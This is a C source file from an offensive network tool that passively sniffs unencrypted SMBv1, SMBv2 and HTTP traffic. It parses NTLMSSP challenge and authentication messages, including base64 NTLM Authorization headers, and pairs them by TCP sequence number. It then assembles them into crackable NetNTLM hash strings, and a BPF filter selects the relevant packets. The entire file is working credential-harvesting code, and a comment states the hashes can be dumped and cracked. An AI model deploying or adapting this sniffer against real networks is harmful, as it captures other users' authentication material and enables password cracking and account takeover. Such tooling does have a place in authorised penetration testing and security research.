/*
 * Passively collect NetNTLM hashes from unencrypted SMBv1, SMBv2, and HTTP traffic
 * Copyright (C) 2023  Sabrina Andersen (NukingDragons)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

#include <utils.h>
#include <ntlmssp.h>

#include <stdio.h>
#include <time.h>

#pragma pack(push, 1)
struct ntlmssp_t
{
	char magic[8];
	uint32_t type;
};

struct ntlmssp_challenge_t
{
	char magic[8];
	uint32_t type;
	uint16_t target_name_len;
	uint16_t target_name_maxlen;
	uint32_t target_name_offset;
	uint32_t negotiate_flags;
	// What I care about falls below this comment
	uint64_t challenge;
};

struct ntlmssp_auth_t
{
	char magic[8];
	uint32_t type;
	uint16_t lan_manager_response_len;
	uint16_t lan_manager_response_maxlen;
	uint32_t lan_manager_response_offset;
	// What I care about falls below this comment
	uint16_t response_len;
	uint16_t response_maxlen;
	uint32_t response_offset;
	uint16_t domain_len;
	uint16_t domain_maxlen;
	uint32_t domain_offset;
	uint16_t username_len;
	uint16_t username_maxlen;
	uint32_t username_offset;
};
#pragma pack(pop)

struct netntlm_t *allocate_netntlm(struct netntlm_t *stack)
{
	struct netntlm_t *netntlm = malloc(sizeof(struct netntlm_t));

	if (netntlm)
	{
		memset(netntlm, 0, sizeof(struct netntlm_t));
		
		if (stack)
		{
			// Seek to the top of the stack
			struct netntlm_t *top = stack;
			while (top->next)
				top = top->next;

			// Add to the stack
			top->next = netntlm;
			netntlm->prev = top;
		}
	}

	return netntlm;
}

struct netntlm_t *seek_seq(struct netntlm_t *stack, uint32_t seq)
{
	struct netntlm_t *netntlm = 0;

	uint8_t found = 0;

	if (stack && seq)
	{
		netntlm = stack;

		if (netntlm->next)
		{
			while (netntlm->next)
			{
				if (netntlm->seq == seq)
				{
					found = 1;
					break;
				}

				netntlm = netntlm->next;
			}
		}
		else if (netntlm->seq == seq)
			found = 1;
	}

	// Set to 0 if not found
	if (!found)
		netntlm = 0;

	return netntlm;
}

void free_netntlm(struct netntlm_t *netntlm, struct netntlm_t **stack)
{
	if (netntlm)
	{
		// Only remove from the stack if it's on one
		if (netntlm->prev)
			netntlm->prev->next = netntlm->next;

		if (netntlm->next)
			netntlm->next->prev = netntlm->prev;

		// Check and remove all of the internal fields
		if (netntlm->username)      free(netntlm->username);
		if (netntlm->domain)        free(netntlm->domain);
		if (netntlm->challenge_str) free(netntlm->challenge_str);
		if (netntlm->proof_str)     free(netntlm->proof_str);
		if (netntlm->response_str)  free(netntlm->response_str);
		if (netntlm->response)      free(netntlm->response);
		if (netntlm->complete_hash) free(netntlm->complete_hash);

		// Update the stack
		if (stack)
			if (*stack == netntlm)
				*stack = netntlm->next;

		free(netntlm);
	}
}

void purge_netntlm(struct netntlm_t *stack)
{
	if (stack)
	{
		struct netntlm_t *c = stack;

		while (c)
			free_netntlm(c, &c);
	}
}

void clean_netntlm(uint64_t seconds, struct netntlm_t **stack)
{
	if (stack
	&&  seconds)
	{
		struct netntlm_t *c = *stack;
		struct netntlm_t *next = 0;

		uint64_t now = time(0);

		while (c)
		{
			// Store the next before the free
			next = c->next;

			// Free if too old, and has a timestamp
			if (c->timestamp
			&&  (now - seconds) >= c->timestamp)
				free_netntlm(c, stack);

			// Go to the next entry on the stack
			c = next;
		}
	}
}

void *create_ntlmssp_handle(void)
{
	// This will hold the address to the stack pointer
	struct netntlm_t **r = malloc(sizeof(void *));

	// Set the pointer to 0 for now
	if (r)
		*r = 0;

	return r;
}

void clean_ntlmssp_handle(void *handle, uint64_t seconds)
{
	if (handle)
	{
		// Get the stack from the handle
		struct netntlm_t *stack = *((void **) handle);
		clean_netntlm(seconds, &stack);

		// Update the stack in the handle
		*((void **) handle) = stack;
	}
}

void free_ntlmssp_handle(void *handle)
{
	if (handle)
	{
		purge_netntlm(*((void ** )handle));
		free(handle);
	}
}

int8_t handle_ntlmssp_raw(void *handle, uint8_t *buf, int32_t len, ntlmssp_callback_t callback, void *callback_args)
{
	int8_t r = 0;
	int8_t skip_packet = 0;

	struct ntlmssp_t *ntlmssp = 0;
	uint8_t free_ntlmssp = 0;

	uint32_t cur_seq = 0;
	uint32_t ack_seq = 0;

	char src_ip[16];
	char dst_ip[16];

	int16_t src_port = 0;
	int16_t dst_port = 0;

	struct netntlm_t *stack = 0;
	struct netntlm_t *netntlm = 0;

	memset(src_ip, 0, 16);
	memset(dst_ip, 0, 16);

	if (buf && len
	&&  handle
	&&  callback)
	{
		// The handle refers to the stack in this instance
		stack = *((void **) handle);

		// 14 is the end of the above header
		uint64_t index = 0;
		uint64_t size = 14;

		// Need at least 14 bytes for the ethernet header
		if (len >= size)
		{
			// Get the next header type from ethernet frame
			if (ntohs(*(uint16_t *) (&buf[12])) == 0x0800)	// IPv4
			{
				// Move the size to the end of the header
				index = size;
				size += (buf[index] & 0x0f) * 4;

				if (len >= size)
				{
					// Fetch the IPs
					sprintf(src_ip, "%hhu.%hhu.%hhu.%hhu",
							buf[index + 12],
							buf[index + 13],
							buf[index + 14],
							buf[index + 15]);
					sprintf(dst_ip, "%hhu.%hhu.%hhu.%hhu",
							buf[index + 16],
							buf[index + 17],
							buf[index + 18],
							buf[index + 19]);

					// Get the protocol
					if (buf[index + 9] == 0x06)		// TCP
					{
						// Move the size to the end of the TCP header
						index = size;
						size += ((buf[index +  12] & 0xf0) >> 4) * 4;

						if (len >= size)
						{
							// Fetch the ports
							src_port = ntohs(*(uint32_t *) (&buf[index]));
							dst_port = ntohs(*(uint32_t *) (&buf[index + 2]));

							// Fetch the sequence numbers
							cur_seq = ntohl(*(uint32_t *) (&buf[index + 4]));
							ack_seq = ntohl(*(uint32_t *) (&buf[index + 8]));

							// Move the index to the payload
							index = size;
						}
						else
							skip_packet = 1;
					}
					else
						skip_packet = 1;
				}
				else
					skip_packet = 1;
			}
			else
				skip_packet = 1;
		}
		else
			skip_packet = 1;

		// Unless the packet got skipped, process the payload
		if (!skip_packet)
		{
			// Determine if the packet is an SMB packet
			uint32_t smb_type = ntohl(*(uint32_t *) (&buf[index + 4]));

			// Determine if the packet is an HTTP method
			char request[5];

			memset(request, 0, 5);
			memcpy(request, &buf[index], 4);

			if (smb_type == 0xff534d42	// SMBv1
			||  smb_type == 0xfe534d42)	// SMBv2
			{
				// Extract the size from the NetBIOS Session Service header
				size += ntohl(*(uint32_t *) (&buf[index])) & 0x00FFFFFF;
				index += 8;

				if (len >= size)
				{
					// Find the offset to the "NTLMSSP" header
					uint64_t offset = 0;
					for (uint64_t i = index; i < len; i++)
						if (!strncmp((char *) (&buf[i]), "NTLMSSP", 8))
						{
							offset = i;
							break;
						}

					// If the NTLMSSP has been found, lets process it
					if (offset)
					{
						index = offset;
						ntlmssp = (struct ntlmssp_t *) &buf[offset];
					}
				}
				else
					skip_packet = 1;
			}
			else if (!strncmp(request, "GET",  3)	// Handle HTTP methods
			     ||  !strncmp(request, "PUT",  3)
			     ||  !strncmp(request, "POST", 4)
			     ||  !strncmp(request, "HEAD", 4)
			     ||  !strncmp(request, "PATC", 4)
			     ||  !strncmp(request, "TRAC", 4)
			     ||  !strncmp(request, "OPTI", 4)
			     ||  !strncmp(request, "DELE", 4)
			     ||  !strncmp(request, "CONN", 4)
			     ||  !strncmp(request, "HTTP", 4))
			{
				// The NTLM header will be in an authorization header
				uint8_t newline_count = 0;
				char *auth_line = 0;
				for (char *c = (char *) &buf[index]; *c != 0; c++)
				{
					if (*c == '\n')
						newline_count++;
					else
					{
						// Check for the authorization header
						// Add the headers in this if and the one below if u find more ;P
						if (newline_count
						&& (!strncmp(c, "Authorization:", 14)
						||  !strncmp(c, "WWW-Authenticate:", 17)))
						{
							// Only return the base64
							if (!strncmp(c, "Authorization: NTLM ", 20))
								auth_line = &c[20];
							else if (!strncmp(c, "Authorization: Negotiate ", 25))
								auth_line = &c[25];
							else if (!strncmp(c, "WWW-Authenticate: Negotiate ", 28))
								auth_line = &c[28];

							if (auth_line)
								break;
						}

						newline_count = 0;
					}

					// End of the content
					if (newline_count == 2)
						break;
				}

				// if the auth line has been found, decode the base64 payload
				if (auth_line)
				{
					// Isolate the base64
					for (char *c = auth_line; *c != 0; c++)
						if (*c == '\n')
						{
							*c = 0;
							break;
						}

					// Decode the data
					ntlmssp = (struct ntlmssp_t *) base64_decode(auth_line);

					// Make sure this gets freed later on
					free_ntlmssp = 1;
				}
				else
					skip_packet = 1;
			}
			else
				skip_packet = 1;
		}

		// Process the NTLMSSP, only extracting the types that are needed
		if (!skip_packet
		&&  ntlmssp
		&& !strncmp(ntlmssp->magic, "NTLMSSP", 8)
		&& (ntlmssp->type == 2 || ntlmssp->type == 3))	// 2 = NTLMSSP_CHALLENGE, 3 = NTLMSSP_AUTH
		{
			// Set the sequence number for the stack
			uint32_t seq = (ntlmssp->type == 2) ? ack_seq : cur_seq;

			// Does it exist?
			uint8_t allocate_ntlm = 0;
			if ((netntlm = seek_seq(stack, seq)))
			{
				// Replace the old packet by wiping it and allocating a new one below
				if (ntlmssp->type == 2)
				{
					free_netntlm(netntlm, &stack);
					allocate_ntlm = 1;
				}
				// Populate the rest of the data
				else if (ntlmssp->type == 3)
				{
					struct ntlmssp_auth_t *auth = (struct ntlmssp_auth_t *) ntlmssp;

					if (auth->response_len > 16)
					{
						// Store what's possible
						memcpy(netntlm->proof, &((uint8_t *) ntlmssp)[auth->response_offset], 16);
						memcpy(netntlm->src_ip, src_ip, 16);
						memcpy(netntlm->dst_ip, dst_ip, 16);
						netntlm->src_port = src_port;
						netntlm->dst_port = dst_port;

						netntlm->response_size = auth->response_len - 16;
						if (netntlm->response_size)
							netntlm->response = malloc(netntlm->response_size);

						if (netntlm->response)
						{
							memset(netntlm->response, 0, netntlm->response_size);
							memcpy(netntlm->response, &((uint8_t *) ntlmssp)[auth->response_offset + 16],
							       netntlm->response_size);

							netntlm->proof_str    = hexlify(netntlm->proof, 16);
							netntlm->response_str = hexlify(netntlm->response, netntlm->response_size);

							if (auth->username_len)
								netntlm->username = utf16le_to_ascii(&((uint8_t *) ntlmssp)[auth->username_offset],
															    auth->username_len);

							if (auth->domain_len)
								netntlm->domain   = utf16le_to_ascii(&((uint8_t *) ntlmssp)[auth->domain_offset],
															    auth->domain_len);

							// Build the completed hash
							uint64_t len = 6; // 1 NULL byte, 5 colons for the hash

							if (netntlm->username)      len += strlen(netntlm->username);
							if (netntlm->domain)        len += strlen(netntlm->domain);
							if (netntlm->challenge_str) len += strlen(netntlm->challenge_str);
							if (netntlm->proof_str)     len += strlen(netntlm->proof_str);
							if (netntlm->response_str)  len += strlen(netntlm->response_str);

							netntlm->complete_hash = malloc(len);
							if (netntlm->complete_hash)
							{
								memset(netntlm->complete_hash, 0, len);
								snprintf(netntlm->complete_hash, len, "%s::%s:%s:%s:%s",
									(netntlm->username)      ? netntlm->username      : "",
									(netntlm->domain)        ? netntlm->domain        : "",
									(netntlm->challenge_str) ? netntlm->challenge_str : "",
									(netntlm->proof_str)     ? netntlm->proof_str     : "",
									(netntlm->response_str)  ? netntlm->response_str  : "");

								// Send it to the callback
								r = callback(netntlm, callback_args);
							}
						}
					}

					// All of the above cases result in this getting popped off the stack
					free_netntlm(netntlm, &stack);
				}
			}
			// Otherwise, create it and push it to the stack if its a NTLMSSP_CHALLENGE packet (2)
			else if (ntlmssp->type == 2)
				allocate_ntlm = 1;

			if (allocate_ntlm
			&& (netntlm = allocate_netntlm(stack)))
			{
				struct ntlmssp_challenge_t *challenge = (struct ntlmssp_challenge_t *) ntlmssp;

				// Start the stack if it doesn't exist
				if (!stack)
					stack = netntlm;

				// Store what's possible
				netntlm->seq = seq;
				netntlm->timestamp = time(0);
				netntlm->challenge_str = hexlify((uint8_t *) &challenge->challenge, 8);
				netntlm->challenge = challenge->challenge;
			}

			if (free_ntlmssp)
			{
				free_ntlmssp = 0;
				free(ntlmssp);
			}
		}
		else
		{
			ntlmssp = 0;
			free_ntlmssp = 0;
		}

		// Update the stack in the handle
		*((void **) handle) = stack;
	}
	else
		r = -1;

	return r;
}

#ifndef NTLM_RAW_ONLY
/*
 * The following BPF code was produced using the following command:
 *  ((tcp[12:1] & 0xf0) >> 2)    = The end of the TCP header
 * (((tcp[12:1] & 0xf0) >> 2)+4) = 4 bytes after the end of the TCP header
 * tcpdump -dd "tcp[(((tcp[12:1] & 0xf0) >> 2)+4):4] = 0xff534d42 or tcp[(((tcp[12:1] & 0xf0) >> 2)+4):4] = 0xfe534d42 or tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420 or tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x48454144 or tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354 or tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x50555420 or tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x44454c45 or tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x434f4e4e or tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x4f505449 or tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x54524143 or tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x50415443"
 *
 * The BPF assumes the packet is using ethernet frames.
 *
 * This BPF will filter on SMBv1, SMBv2, as well as all HTTP methods. In these protocols, the NTLMSSP can be embedded and can contain NetNTLM hashes
 * that can be dumped and potentially cracked. In the case of HTTP, this is part of the "Authorization: NTLM <base64>" header, contained in base64
*/
struct sock_filter ntlmssp_bpf[] =
{
	{ 0x28, 0, 0, 0x0000000c },
	{ 0x15, 0, 32, 0x00000800 },
	{ 0x30, 0, 0, 0x00000017 },
	{ 0x15, 0, 30, 0x00000006 },
	{ 0x28, 0, 0, 0x00000014 },
	{ 0x45, 28, 0, 0x00001fff },
	{ 0xb1, 0, 0, 0x0000000e },
	{ 0x50, 0, 0, 0x0000001a },
	{ 0x54, 0, 0, 0x000000f0 },
	{ 0x74, 0, 0, 0x00000002 },
	{ 0x4, 0, 0, 0x00000004 },
	{ 0xc, 0, 0, 0x00000000 },
	{ 0x7, 0, 0, 0x00000000 },
	{ 0x40, 0, 0, 0x0000000e },
	{ 0x15, 18, 0, 0xff534d42 },
	{ 0x15, 17, 0, 0xfe534d42 },
	{ 0xb1, 0, 0, 0x0000000e },
	{ 0x50, 0, 0, 0x0000001a },
	{ 0x54, 0, 0, 0x000000f0 },
	{ 0x74, 0, 0, 0x00000002 },
	{ 0xc, 0, 0, 0x00000000 },
	{ 0x7, 0, 0, 0x00000000 },
	{ 0x40, 0, 0, 0x0000000e },
	{ 0x15, 9, 0, 0x47455420 },
	{ 0x15, 8, 0, 0x48454144 },
	{ 0x15, 7, 0, 0x504f5354 },
	{ 0x15, 6, 0, 0x50555420 },
	{ 0x15, 5, 0, 0x44454c45 },
	{ 0x15, 4, 0, 0x434f4e4e },
	{ 0x15, 3, 0, 0x4f505449 },
	{ 0x15, 2, 0, 0x54524143 },
	{ 0x15, 1, 0, 0x50415443 },
	{ 0x15, 0, 1, 0x48545450 },
	{ 0x6, 0, 0, 0x00040000 },
	{ 0x6, 0, 0, 0x00000000 },
};

int8_t handle_ntlmssp(int32_t sock, int32_t mtu, uint8_t use_bpf, uint64_t stack_timeout, ntlmssp_callback_t callback, void *callback_args)
{
	int8_t r = 0;

	uint8_t *buf = 0;

	if (sock
	&&  mtu
	&&  callback)
	{
		// Apply the BPF if specified
		if (use_bpf)
			r = apply_bpf(sock, ntlmssp_bpf, sizeof(ntlmssp_bpf) / sizeof(ntlmssp_bpf[0]));

		if (!r
		&&  (buf = malloc(mtu)))
		{
			memset(buf, 0, mtu);

			// Create a handle
			void *handle = create_ntlmssp_handle();

			if (handle)
			{
				int32_t len = 0;
				while ((len = recvfrom(sock, buf, mtu, 0, 0, 0)) > 0)
				{
					// No timeout means the stack won't be messed with
					if (stack_timeout)
						clean_ntlmssp_handle(handle, stack_timeout);

					if ((r = handle_ntlmssp_raw(handle, buf, len, callback, callback_args)))
						break;
				}

				free_ntlmssp_handle(handle);
			}
		}
		else
			r = -2;

		free(buf);
	}
	else
		r = -1;

	return r;
}
#endif
